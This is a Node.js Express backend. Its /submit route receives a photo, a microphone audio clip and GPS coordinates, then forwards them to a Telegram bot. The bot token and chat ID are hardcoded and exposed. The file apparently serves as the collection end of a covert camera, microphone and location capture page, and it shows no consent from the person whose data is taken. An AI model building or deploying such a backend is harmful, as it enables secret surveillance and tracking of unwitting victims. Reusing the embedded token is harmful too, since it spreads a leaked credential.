const express = require("express");
const multer = require("multer");
const cors = require("cors");
const { FormData, Blob } = require("undici"); // Ensure Blob is imported for Node environment

const app = express();
app.use(cors());

const upload = multer();

// 🔴 YOUR SETTINGS
const BOT_TOKEN = "8595589382:AAFBQLaKCq8FTfN8HYg2KB9iYhbL4sV6s4c";
const CHAT_ID = "8522367236";

app.get("/", (req, res) => {
  res.send("Backend is alive and ready.");
});

// Updated route to handle multiple fields
app.post("/submit", upload.fields([{ name: 'photo' }, { name: 'audio' }]), async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    
    // Access files from the fields
    const photoFile = req.files['photo'] ? req.files['photo'][0] : null;
    const audioFile = req.files['audio'] ? req.files['audio'][0] : null;

    // 1. Send Photo to Telegram
    if (photoFile) {
      const photoForm = new FormData();
      photoForm.append("chat_id", CHAT_ID);
      photoForm.append("photo", new Blob([photoFile.buffer]), "photo.jpg");
      photoForm.append(
        "caption",
        `📍 Location Update\nLat: ${latitude}\nLong: ${longitude}\n\nAudio clip attached below...`
      );

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: photoForm
      });
    }

    // 2. Send Audio to Telegram
    if (audioFile) {
      const audioForm = new FormData();
      audioForm.append("chat_id", CHAT_ID);
      // We use sendAudio or sendVoice. sendAudio is better for general clips.
      audioForm.append("audio", new Blob([audioFile.buffer]), "mic_capture.webm");

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
        method: "POST",
        body: audioForm
      });
    }

    console.log(`✅ Data received from Lat: ${latitude}, Lon: ${longitude}`);
    res.json({ success: true });

  } catch (err) {
    console.error("SERVER ERROR:", err);
    res.status(500).json({ error: "Failed to forward data to Telegram" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));